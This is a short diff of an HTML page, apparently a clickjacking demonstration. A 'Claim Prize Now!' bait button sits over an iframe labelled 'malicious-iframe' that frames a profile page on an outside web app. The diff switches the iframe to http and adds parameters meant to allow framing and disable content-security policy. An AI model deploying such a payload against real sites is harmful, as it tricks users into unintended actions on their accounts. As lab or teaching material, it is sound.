@@ -64,9 +64,9 @@
         <button class="bait-button">Claim Prize Now!</button>
 
         <iframe
-            class="malicious-iframe"
-            src="https://webapp.kr-rezvan.ir/profile?allow_framing=true"
-            scrolling="no"
+                class="malicious-iframe"
+                src="http://webapp.kr-rezvan.ir/profile?allow_framing=true&disable_csp=true"
+                scrolling="no"
         ></iframe>
     </div>
 
